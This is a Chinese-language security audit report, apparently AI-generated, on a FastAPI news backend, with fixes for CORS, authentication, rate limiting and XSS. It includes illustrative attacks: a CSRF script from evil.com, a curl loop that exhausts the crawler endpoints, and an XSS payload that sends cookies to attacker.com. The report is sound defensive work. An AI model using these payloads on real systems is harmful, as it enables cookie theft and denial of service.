# 安全审计报告

**项目名称**: NowInOpenHarmony Backend
**审计日期**: 2025-11-16
**审计范围**: 完整代码库静态分析
**审计方法**: 代码审查 + 配置审查 + 架构审查
**当前安全评分**: 6/10

---

## 执行摘要

本次安全审计对 NowInOpenHarmony 后端服务进行了全面的安全检查,发现了 **2个高危问题**、**3个中危问题** 和 **2个低危问题**。项目在容器化和基础架构方面做得较好,但在API安全、输入验证和访问控制方面存在显著风险。

**关键发现**:
- ❌ 所有API端点无需认证即可访问
- ❌ CORS配置允许所有来源并启用凭据传递
- ⚠️ 缺少速率限制,易被滥用
- ⚠️ 爬取的HTML内容未净化,存在XSS风险
- ✅ 使用Docker容器化隔离
- ✅ 使用Nginx反向代理和SSL/TLS

**建议优先级**:
1. **P0 (立即修复)**: CORS配置、API认证
2. **P1 (短期修复)**: 速率限制、HTML净化
3. **P2 (中期改进)**: 错误处理、审计日志
4. **P3 (长期优化)**: ORM迁移、秘密管理

---

## 1. 高危问题 (Critical)

### 1.1 CORS配置过于宽松

**位置**: `main.py:46`
**CVE参考**: CWE-942 (Permissive Cross-domain Policy with Untrusted Domains)
**CVSS评分**: 7.5 (High)

**问题描述**:
```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.cors_origins,  # 默认为 ["*"]
    allow_credentials=True,               # 允许携带凭据
    allow_methods=["*"],                  # 允许所有HTTP方法
    allow_headers=["*"],                  # 允许所有请求头
)
```

**风险分析**:
- 允许任意域名访问API并携带凭据(cookies/tokens)
- 可能导致CSRF攻击,攻击者可从恶意网站发起认证请求
- 违反同源策略(SOP)的基本安全原则
- 如果将来添加认证,可能导致会话劫持

**利用场景**:
```html
<!-- 攻击者网站 evil.com -->
<script>
fetch('http://victim-api.com/api/news/crawl', {
    method: 'POST',
    credentials: 'include',  // 携带受害者的cookies
    body: JSON.stringify({source: 'all'})
})
</script>
```

**修复方案**:
```python
# core/config.py
cors_origins: list = Field(
    default=["http://localhost:3000"],
    env="CORS_ORIGINS",
    description="允许的CORS来源,多个用逗号分隔"
)

# main.py
if "*" in settings.cors_origins and allow_credentials:
    raise ValueError("Cannot use allow_origins=['*'] with allow_credentials=True")

app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.cors_origins,
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allow_headers=["Content-Type", "Authorization", "X-API-Key"],
    max_age=3600,
)
```

**验证方法**:
```bash
# 测试CORS配置
curl -H "Origin: http://evil.com" \
     -H "Access-Control-Request-Method: POST" \
     -X OPTIONS \
     http://localhost:8001/api/news/crawl -v

# 应该返回 403 或不返回 Access-Control-Allow-Origin
```

---

### 1.2 缺少API认证和授权机制

**位置**: 所有API端点 (`api/news.py`, `api/banner.py`)
**CVE参考**: CWE-306 (Missing Authentication for Critical Function)
**CVSS评分**: 7.1 (High)

**问题描述**:
以下敏感端点无需任何认证:
- `POST /api/news/crawl` - 手动触发爬虫
- `POST /api/banner/crawl` - 手动触发Banner爬虫
- `DELETE /api/banner/cache/clear` - 清空缓存
- `POST /api/news/cache/refresh` - 刷新缓存

**风险分析**:
- 任何人都可以触发资源密集型爬虫任务
- 可能导致资源耗尽(CPU/内存/网络)
- 可能被用于DoS攻击
- 清空缓存会影响所有用户的服务质量

**利用场景**:
```bash
# 攻击者可以持续调用爬虫接口耗尽资源
while true; do
    curl -X POST http://victim-api.com/api/news/crawl?source=all
    curl -X POST http://victim-api.com/api/banner/crawl
    sleep 1
done
```

**修复方案**:

**方案1: API密钥认证** (推荐,简单实用)
```python
# core/auth.py
import os
import secrets
from fastapi import Security, HTTPException, status
from fastapi.security import APIKeyHeader

API_KEY_HEADER = APIKeyHeader(name="X-API-Key", auto_error=False)

async def verify_api_key(api_key: str = Security(API_KEY_HEADER)) -> str:
    """验证API密钥"""
    expected_key = os.getenv("API_SECRET_KEY")

    if not expected_key:
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="API key not configured"
        )

    if not api_key:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="API key required",
            headers={"WWW-Authenticate": "ApiKey"},
        )

    # 使用常量时间比较防止时序攻击
    if not secrets.compare_digest(api_key, expected_key):
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Invalid API key"
        )

    return api_key

# api/news.py
from core.auth import verify_api_key
from fastapi import Depends

@router.post("/crawl", dependencies=[Depends(verify_api_key)])
async def crawl_news(source: NewsSource = None):
    """手动触发新闻爬取 - 需要API密钥认证"""
    ...
```

**方案2: OAuth2 + JWT** (更复杂,适合多用户场景)
```python
# core/auth.py
from datetime import datetime, timedelta
from jose import JWTError, jwt
from fastapi import Depends, HTTPException, status
from fastapi.security import OAuth2PasswordBearer

oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")

def create_access_token(data: dict, expires_delta: timedelta = None):
    to_encode = data.copy()
    expire = datetime.utcnow() + (expires_delta or timedelta(minutes=15))
    to_encode.update({"exp": expire})
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)

async def get_current_user(token: str = Depends(oauth2_scheme)):
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        username: str = payload.get("sub")
        if username is None:
            raise HTTPException(status_code=401, detail="Invalid token")
        return username
    except JWTError:
        raise HTTPException(status_code=401, detail="Invalid token")
```

**环境变量配置**:
```bash
# .env
API_SECRET_KEY=$(python -c "import secrets; print(secrets.token_urlsafe(32))")
```

**验证方法**:
```bash
# 无密钥应该被拒绝
curl -X POST http://localhost:8001/api/news/crawl
# 预期: 401 Unauthorized

# 有效密钥应该成功
curl -X POST http://localhost:8001/api/news/crawl \
  -H "X-API-Key: your-secret-key"
# 预期: 200 OK
```

---

## 2. 中危问题 (High)

### 2.1 缺少请求速率限制

**位置**: 所有API端点
**CVE参考**: CWE-770 (Allocation of Resources Without Limits)
**CVSS评分**: 5.3 (Medium)

**问题描述**:
没有任何速率限制机制,单个IP可以无限制调用API。

**风险分析**:
- 可被用于应用层DoS攻击
- 爬虫端点可能耗尽服务器资源
- 数据库查询端点可能造成慢查询攻击
- 影响正常用户的服务质量

**修复方案**:
```bash
# 安装依赖
pip install slowapi
```

```python
# main.py
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

# 创建限流器
limiter = Limiter(
    key_func=get_remote_address,
    default_limits=["200/minute"],  # 全局默认限制
    storage_uri="memory://",  # 使用内存存储,生产环境建议用Redis
)

app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

# api/news.py
from slowapi import Limiter
from slowapi.util import get_remote_address
from fastapi import Request

limiter = Limiter(key_func=get_remote_address)

@router.get("/")
@limiter.limit("100/minute")  # 查询接口较宽松
async def get_news(request: Request, ...):
    ...

@router.post("/crawl", dependencies=[Depends(verify_api_key)])
@limiter.limit("5/minute")  # 爬虫接口严格限制
async def crawl_news(request: Request, ...):
    ...
```

**高级配置** (使用Redis,支持分布式):
```python
# 安装依赖
pip install redis

# 配置
limiter = Limiter(
    key_func=get_remote_address,
    storage_uri="redis://localhost:6379",
    strategy="fixed-window",  # 或 "moving-window"
)
```

**测试方法**:
```bash
# 快速发送多个请求测试限流
for i in {1..10}; do
    curl http://localhost:8001/api/news/
done
# 应该在超过限制后返回 429 Too Many Requests
```

---

### 2.2 XSS防护不足

**位置**: 爬虫服务 (`services/*_crawler.py`) + 数据模型 (`models/news.py`)
**CVE参考**: CWE-79 (Improper Neutralization of Input During Web Page Generation)
**CVSS评分**: 6.1 (Medium)

**问题描述**:
爬取的新闻内容直接存储和返回,未进行HTML净化。

**风险分析**:
- 如果目标网站被入侵,恶意脚本可能通过爬虫传播
- Stored XSS: 恶意内容存储在数据库,影响所有查看的用户
- 可能窃取用户凭据、执行未授权操作

**示例攻击载荷**:
```html
<!-- 假设爬取到的内容包含 -->
<div>正常新闻内容</div>
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>
<img src=x onerror="alert('XSS')">
```

**修复方案**:
```bash
# 安装HTML净化库
pip install bleach
```

```python
# services/html_sanitizer.py
import bleach
from typing import Dict, List

class HTMLSanitizer:
    """HTML内容净化器"""

    # 允许的HTML标签
    ALLOWED_TAGS = [
        'p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
        'ul', 'ol', 'li', 'blockquote', 'code', 'pre', 'a', 'img'
    ]

    # 允许的HTML属性
    ALLOWED_ATTRIBUTES = {
        'a': ['href', 'title'],
        'img': ['src', 'alt', 'title', 'width', 'height'],
    }

    # 允许的URL协议
    ALLOWED_PROTOCOLS = ['http', 'https']

    @classmethod
    def sanitize(cls, html: str) -> str:
        """净化HTML内容"""
        if not html:
            return ""

        return bleach.clean(
            html,
            tags=cls.ALLOWED_TAGS,
            attributes=cls.ALLOWED_ATTRIBUTES,
            protocols=cls.ALLOWED_PROTOCOLS,
            strip=True,  # 移除不允许的标签而不是转义
        )

    @classmethod
    def sanitize_text(cls, text: str) -> str:
        """净化纯文本内容(移除所有HTML)"""
        if not text:
            return ""
        return bleach.clean(text, tags=[], strip=True)

# services/openharmony_news_crawler.py
from .html_sanitizer import HTMLSanitizer

def parse_article_content(self, content_div) -> List[Dict]:
    """解析文章内容"""
    result_data = []

    for element in content_div.find_all(['p', 'h1', 'h2', 'img']):
        if element.name == 'img':
            src = element.get('src', '')
            if src:
                # URL验证
                if not src.startswith(('http://', 'https://')):
                    src = urljoin(self.base_url, src)
                result_data.append({
                    "type": "image",
                    "value": HTMLSanitizer.sanitize(src)
                })
        else:
            text = element.get_text().strip()
            if text and len(text) > 10:
                # 净化文本内容
                text = HTMLSanitizer.sanitize_text(text)
                result_data.append({
                    "type": "text",
                    "value": text
                })

    return result_data
```

**测试方法**:
```python
# 创建测试文件 test_xss_protection.py
from services.html_sanitizer import HTMLSanitizer

def test_xss_protection():
    malicious_html = '''
        <p>正常内容</p>
        <script>alert('XSS')</script>
        <img src=x onerror="alert('XSS')">
        <a href="javascript:alert('XSS')">链接</a>
    '''

    cleaned = HTMLSanitizer.sanitize(malicious_html)

    assert '<script>' not in cleaned
    assert 'onerror' not in cleaned
    assert 'javascript:' not in cleaned
    assert '<p>正常内容</p>' in cleaned

    print("✓ XSS防护测试通过")

if __name__ == "__main__":
    test_xss_protection()
```

---

### 2.3 敏感信息泄露

**位置**: 多个文件
**CVE参考**: CWE-209 (Generation of Error Message Containing Sensitive Information)
**CVSS评分**: 5.3 (Medium)

**问题1: 弱密码示例** (`.env.example`)
```env
# 当前配置
POSTGRES_PASSWORD=openharmony2025  # 太弱
REDIS_PASSWORD=redis2025           # 太弱
SECRET_KEY=your-super-secret-key-change-this-in-production  # 容易被遗忘更改
```

**修复**:
```env
# .env.example (更新后)
# 安全密钥生成方法:
# python -c "import secrets; print(secrets.token_hex(32))"

SECRET_KEY=REPLACE_WITH_64_CHAR_HEX_STRING_GENERATED_ABOVE
API_SECRET_KEY=REPLACE_WITH_RANDOM_API_KEY

# 数据库密码要求: 至少16字符,包含大小写字母、数字、特殊字符
POSTGRES_PASSWORD=REPLACE_WITH_STRONG_PASSWORD_MIN_16_CHARS
REDIS_PASSWORD=REPLACE_WITH_STRONG_PASSWORD_MIN_16_CHARS

# 严重警告: 绝不要在生产环境使用示例密码!
```

**问题2: 详细错误消息泄露**
虽然 `main.py:70-74` 做了处理,但爬虫和服务层可能泄露内部信息。

**改进错误处理**:
```python
# core/exceptions.py
import logging
from typing import Optional, Dict

logger = logging.getLogger(__name__)

class AppException(Exception):
    """应用基础异常"""
    def __init__(
        self,
        message: str,
        user_message: Optional[str] = None,
        details: Optional[Dict] = None
    ):
        self.message = message  # 内部日志消息(详细)
        self.user_message = user_message or "An error occurred"  # 用户看到的消息(模糊)
        self.details = details or {}
        super().__init__(self.message)

class CrawlerException(AppException):
    """爬虫异常"""
    pass

class DatabaseException(AppException):
    """数据库异常"""
    pass

# 使用示例
try:
    result = database.execute("SELECT * FROM sensitive_table WHERE id = ?", (user_id,))
except Exception as e:
    # 记录详细错误到日志
    logger.error(f"Database query failed: {e}", exc_info=True, extra={
        "user_id": user_id,
        "query": "SELECT sensitive_table"
    })
    # 向用户返回模糊错误
    raise DatabaseException(
        message=f"Database error: {str(e)}",  # 详细信息(日志)
        user_message="Unable to retrieve data",  # 模糊信息(API响应)
    )
```

**问题3: 日志中的敏感信息**

**创建日志过滤器**:
```python
# core/logging_config.py
import re
import logging

class SensitiveDataFilter(logging.Filter):
    """过滤日志中的敏感信息"""

    PATTERNS = [
        (re.compile(r'password["\']?\s*[:=]\s*["\']?(\S+)', re.I), 'password=***'),
        (re.compile(r'token["\']?\s*[:=]\s*["\']?(\S+)', re.I), 'token=***'),
        (re.compile(r'api[_-]?key["\']?\s*[:=]\s*["\']?(\S+)', re.I), 'api_key=***'),
        (re.compile(r'secret["\']?\s*[:=]\s*["\']?(\S+)', re.I), 'secret=***'),
    ]

    def filter(self, record: logging.LogRecord) -> bool:
        # 过滤消息内容
        if isinstance(record.msg, str):
            for pattern, replacement in self.PATTERNS:
                record.msg = pattern.sub(replacement, record.msg)

        # 过滤参数
        if record.args:
            filtered_args = []
            for arg in record.args:
                if isinstance(arg, str):
                    for pattern, replacement in self.PATTERNS:
                        arg = pattern.sub(replacement, arg)
                filtered_args.append(arg)
            record.args = tuple(filtered_args)

        return True

# 应用过滤器
for handler in logging.root.handlers:
    handler.addFilter(SensitiveDataFilter())
```

---

## 3. 低危问题 (Medium)

### 3.1 SQL注入风险(潜在)

**位置**: `core/database.py`
**CVE参考**: CWE-89 (SQL Injection)
**CVSS评分**: 4.0 (Medium - 当前实现相对安全,但存在隐患)

**当前状态**:
虽然提供了参数化查询函数,但不强制使用,未来可能引入风险。

**建议**:
1. 强制使用参数化查询
2. 添加SQL注入检测
3. 考虑迁移到ORM (SQLAlchemy)

**示例(ORM迁移)**:
```python
# models/database_models.py
from sqlalchemy import Column, Integer, String, DateTime, Text, create_engine
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker

Base = declarative_base()

class NewsArticle(Base):
    __tablename__ = "news_articles"

    id = Column(Integer, primary_key=True, index=True)
    title = Column(String, nullable=False, index=True)
    source = Column(String, nullable=False, index=True)
    url = Column(String, unique=True, nullable=False)
    content = Column(Text)
    published_at = Column(DateTime, index=True)
    created_at = Column(DateTime)

# 使用ORM(自动参数化,防止SQL注入)
from sqlalchemy.orm import Session

def get_news_by_source(db: Session, source: str):
    return db.query(NewsArticle).filter(
        NewsArticle.source == source  # 自动参数化
    ).all()

def search_news(db: Session, keyword: str):
    return db.query(NewsArticle).filter(
        NewsArticle.title.like(f"%{keyword}%")  # 安全的like查询
    ).all()
```

### 3.2 缺少HTTPS强制重定向

**位置**: `nginx/conf.d/openharmony.conf`
**建议**: 添加HTTP到HTTPS的强制重定向

```nginx
server {
    listen 80;
    server_name your-domain.com;

    # 强制重定向到HTTPS
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    server_name your-domain.com;

    # SSL配置...
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;

    # 强制HSTS(HTTP Strict Transport Security)
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

    # ...其他配置
}
```

---

## 4. 安全最佳实践建议

### 4.1 命令注入防护

**当前状态**: `run.py:64-95` 使用 `subprocess.run()`,当前是硬编码命令,相对安全。

**建议**:
```python
# 如果需要使用用户输入,严格验证
import shlex
from typing import List

def safe_execute_command(command: List[str], timeout: int = 10):
    """安全地执行系统命令"""
    # 1. 使用列表形式(不使用shell=True)
    # 2. 验证命令是否在白名单中
    allowed_commands = ['ipconfig', 'ifconfig', 'ip']
    if command[0] not in allowed_commands:
        raise ValueError(f"Command not allowed: {command[0]}")

    # 3. 设置超时
    result = subprocess.run(
        command,
        capture_output=True,
        text=True,
        timeout=timeout,
        shell=False,  # 永远不要使用 shell=True
    )
    return result.stdout
```

### 4.2 依赖项安全扫描

**实施方法**:
```bash
# 安装工具
pip install safety pip-audit

# 方法1: 使用 safety
safety check --json

# 方法2: 使用 pip-audit (更现代)
pip-audit

# 方法3: 集成到CI/CD (GitHub Actions)
# .github/workflows/security.yml
name: Security Scan
on: [push, pull_request]
jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Set up Python
        uses: actions/setup-python@v2
        with:
          python-version: '3.8'
      - name: Install dependencies
        run: pip install safety pip-audit
      - name: Run safety check
        run: safety check
      - name: Run pip-audit
        run: pip-audit
```

### 4.3 秘密管理

**不要**:
- 在代码中硬编码秘密
- 提交 `.env` 文件到Git
- 在日志中记录秘密

**推荐**:
```bash
# 开发环境: 使用 .env 文件 + python-dotenv
pip install python-dotenv

# 生产环境: 使用专业秘密管理工具
# - HashiCorp Vault
# - AWS Secrets Manager
# - Azure Key Vault
# - Google Cloud Secret Manager
# - Docker Secrets

# Docker Secrets示例
docker secret create api_secret_key ./api_key.txt
docker service create --secret api_secret_key myapp
```

### 4.4 审计日志

```python
# core/audit.py
import logging
from datetime import datetime
from typing import Optional
from fastapi import Request

# 创建专门的审计日志记录器
audit_logger = logging.getLogger("audit")
audit_handler = logging.FileHandler("logs/audit.log")
audit_handler.setFormatter(logging.Formatter(
    '{"timestamp":"%(asctime)s","level":"%(levelname)s","event":"%(message)s"}'
))
audit_logger.addHandler(audit_handler)
audit_logger.setLevel(logging.INFO)

def log_security_event(
    event_type: str,
    request: Request,
    user: Optional[str] = None,
    details: Optional[dict] = None
):
    """记录安全事件"""
    audit_logger.info(
        f"Security Event",
        extra={
            "event_type": event_type,
            "ip": request.client.host,
            "user_agent": request.headers.get("user-agent"),
            "user": user or "anonymous",
            "path": request.url.path,
            "method": request.method,
            "details": details or {},
        }
    )

# 使用示例
@router.post("/crawl", dependencies=[Depends(verify_api_key)])
async def crawl_news(request: Request, source: NewsSource):
    log_security_event(
        "manual_crawl_triggered",
        request,
        user=request.state.api_key_owner,  # 如果有用户系统
        details={"source": source.value}
    )
    # ... 执行爬虫
```

---

## 5. 修复优先级和时间表

| 优先级 | 问题 | 严重程度 | 预计工作量 | 建议完成时间 |
|--------|------|---------|-----------|-------------|
| **P0** | 修复CORS配置 | 高危 | 0.5小时 | 立即 |
| **P0** | 添加API认证 | 高危 | 2小时 | 立即 |
| **P0** | 更新.env.example | 中危 | 0.5小时 | 立即 |
| **P1** | 添加速率限制 | 中危 | 1小时 | 1周内 |
| **P1** | 净化HTML内容 | 中危 | 2小时 | 1周内 |
| **P1** | 依赖项安全扫描 | 中危 | 1小时 | 1周内 |
| **P2** | 改进错误处理 | 低危 | 3小时 | 2周内 |
| **P2** | 添加审计日志 | 低危 | 2小时 | 2周内 |
| **P2** | 增强日志过滤 | 低危 | 1小时 | 2周内 |
| **P3** | 迁移到ORM | 低危 | 8小时 | 1个月内 |
| **P3** | 实现秘密管理 | 低危 | 4小时 | 1个月内 |

**总计**: 约 25小时工作量

---

## 6. 合规性检查清单

### OWASP Top 10 2021

| # | 风险 | 当前状态 | 修复后 | 备注 |
|---|------|---------|--------|------|
| A01 | Broken Access Control | ❌ 未实现 | ✅ 已修复 | 添加API认证 |
| A02 | Cryptographic Failures | ⚠️ 部分 | ✅ 已修复 | HTTPS + 秘密管理 |
| A03 | Injection | ⚠️ 部分 | ✅ 已修复 | 参数化查询 + ORM |
| A04 | Insecure Design | ⚠️ 部分 | ⚠️ 改进中 | 需要威胁建模 |
| A05 | Security Misconfiguration | ❌ CORS错误 | ✅ 已修复 | 修复CORS配置 |
| A06 | Vulnerable Components | ⚠️ 未检查 | ✅ 已修复 | 添加依赖扫描 |
| A07 | Identification/Authentication | ❌ 未实现 | ✅ 已修复 | API认证 |
| A08 | Software/Data Integrity | ⚠️ 部分 | ⚠️ 改进中 | 需要签名验证 |
| A09 | Logging/Monitoring | ⚠️ 部分 | ✅ 已修复 | 审计日志 |
| A10 | Server-Side Request Forgery | ✅ 安全 | ✅ 安全 | 爬虫有URL验证 |

**修复前评分**: 4/10
**修复后评分**: 8/10

### CIS Benchmarks (部分)

- ✅ 使用非特权用户运行容器
- ✅ 启用只读文件系统(部分)
- ⚠️ 资源限制(需要完善)
- ✅ 网络隔离(Docker网络)
- ❌ 定期安全扫描(待实施)

---

## 7. 持续安全监控

### 7.1 监控指标

建议监控以下安全指标:

```yaml
监控项:
  - 名称: 认证失败率
    指标: failed_auth_attempts / total_auth_attempts
    阈值: > 10%
    告警: 可能的暴力破解攻击

  - 名称: 异常请求频率
    指标: requests_per_ip
    阈值: > 1000/分钟
    告警: 可能的DoS攻击

  - 名称: 4xx/5xx错误率
    指标: (status_4xx + status_5xx) / total_requests
    阈值: > 5%
    告警: 应用异常或攻击

  - 名称: 数据库连接数
    指标: active_db_connections
    阈值: > 80% max_connections
    告警: 资源耗尽风险
```

### 7.2 日志分析

**使用ELK Stack或类似工具**:
```yaml
# docker-compose.yml 添加ELK
elasticsearch:
  image: elasticsearch:8.0.0
  environment:
    - discovery.type=single-node

logstash:
  image: logstash:8.0.0
  volumes:
    - ./logs:/logs

kibana:
  image: kibana:8.0.0
  ports:
    - 5601:5601
```

---

## 8. 应急响应计划

### 8.1 安全事件分类

| 级别 | 描述 | 响应时间 | 行动 |
|------|------|---------|------|
| P0 | 严重数据泄露、服务完全中断 | 15分钟 | 立即隔离、通知高管 |
| P1 | 部分服务中断、疑似攻击 | 1小时 | 调查、临时缓解 |
| P2 | 异常活动、性能下降 | 4小时 | 分析日志、监控 |
| P3 | 一般安全告警 | 24小时 | 记录、计划修复 |

### 8.2 事件响应步骤

1. **检测**: 自动告警或人工发现
2. **隔离**: 限制受影响范围
3. **根除**: 移除威胁源
4. **恢复**: 恢复正常服务
5. **总结**: 事后分析报告

---

## 9. 结论

### 9.1 当前安全状况

**优点**:
- ✅ 使用Docker容器化隔离
- ✅ Nginx反向代理和基本HTTP安全头
- ✅ 参数化数据库查询(部分)
- ✅ 错误消息脱敏(部分)
- ✅ 非特权用户运行

**缺点**:
- ❌ 缺少API认证机制
- ❌ CORS配置过于宽松
- ❌ 无速率限制
- ❌ HTML内容未净化

### 9.2 修复后预期

完成P0和P1优先级修复后:
- 🔒 API认证保护敏感端点
- 🔒 CORS仅允许可信来源
- 🔒 速率限制防止滥用
- 🔒 XSS防护净化内容
- 📊 审计日志记录安全事件
- 🔍 依赖项定期扫描

**预期安全评分**: 8/10

### 9.3 建议

1. **立即修复P0问题** (3小时工作量)
2. **1周内完成P1修复** (4小时工作量)
3. **建立定期安全审查机制** (每月)
4. **实施持续安全监控** (使用SIEM工具)
5. **定期更新依赖项** (每月)
6. **安全培训** (团队成员)

---

## 附录A: 快速修复脚本

```bash
#!/bin/bash
# quick_security_fixes.sh - 快速应用关键安全修复

echo "=== NowInOpenHarmony 安全快速修复 ==="

# 1. 生成安全密钥
echo "生成安全密钥..."
SECRET_KEY=$(python3 -c "import secrets; print(secrets.token_hex(32))")
API_SECRET_KEY=$(python3 -c "import secrets; print(secrets.token_urlsafe(32))")

# 2. 更新 .env 文件
echo "更新环境变量配置..."
if [ -f .env ]; then
    cp .env .env.backup.$(date +%Y%m%d_%H%M%S)
fi

cat > .env << EOF
SECRET_KEY=${SECRET_KEY}
API_SECRET_KEY=${API_SECRET_KEY}
CORS_ORIGINS=http://localhost:3000
# 请根据实际情况修改CORS_ORIGINS
EOF

echo "✓ 环境变量已更新"

# 3. 安装安全依赖
echo "安装安全相关依赖..."
pip install slowapi bleach safety pip-audit

# 4. 运行安全扫描
echo "运行依赖项安全扫描..."
safety check || echo "⚠️ 发现安全漏洞,请查看上面的输出"
pip-audit || echo "⚠️ 发现安全漏洞,请查看上面的输出"

# 5. 更新 requirements.txt
echo "更新依赖清单..."
pip freeze > requirements.txt

echo ""
echo "=== 修复完成 ==="
echo "请注意:"
echo "1. 查看 .env 文件并根据需要调整CORS_ORIGINS"
echo "2. 按照SECURITY_AUDIT_REPORT.md实施代码更改"
echo "3. 重启应用以应用更改"
```

---

## 附录B: 安全检查清单

在部署到生产环境前,请确保完成以下检查:

```markdown
### 环境配置
- [ ] SECRET_KEY已使用随机生成的64位十六进制字符串
- [ ] API_SECRET_KEY已配置且足够复杂
- [ ] CORS_ORIGINS仅包含可信域名(不含*)
- [ ] 数据库密码强度足够(≥16字符)
- [ ] .env文件不在Git仓库中(.gitignore已配置)

### 安全功能
- [ ] API认证已实施并测试
- [ ] 速率限制已配置
- [ ] HTML内容净化已实施
- [ ] 错误处理不泄露敏感信息
- [ ] 审计日志已启用

### 网络安全
- [ ] HTTPS已启用(Let's Encrypt或其他证书)
- [ ] HTTP强制重定向到HTTPS
- [ ] HSTS头已配置
- [ ] 防火墙规则已配置
- [ ] 仅必要端口对外开放

### 应用安全
- [ ] 依赖项已扫描无已知漏洞
- [ ] 使用非特权用户运行
- [ ] Docker安全配置已应用
- [ ] 文件权限正确设置
- [ ] 日志文件不包含敏感信息

### 监控和响应
- [ ] 健康检查端点正常工作
- [ ] 日志聚合和分析已配置
- [ ] 告警机制已设置
- [ ] 应急响应计划已制定
- [ ] 备份策略已实施

### 合规性
- [ ] 隐私政策已制定(如适用)
- [ ] 数据保护措施符合GDPR/CCPA(如适用)
- [ ] 安全政策文档已编写
- [ ] 团队成员已接受安全培训
```

---

**报告编制**: Claude Code Security Audit
**报告日期**: 2025-11-16
**下次审计建议**: 2025-12-16 (1个月后)
**联系方式**: 参考README.md "安全问题报告"章节

---

*本报告包含敏感安全信息,请勿公开分享。*
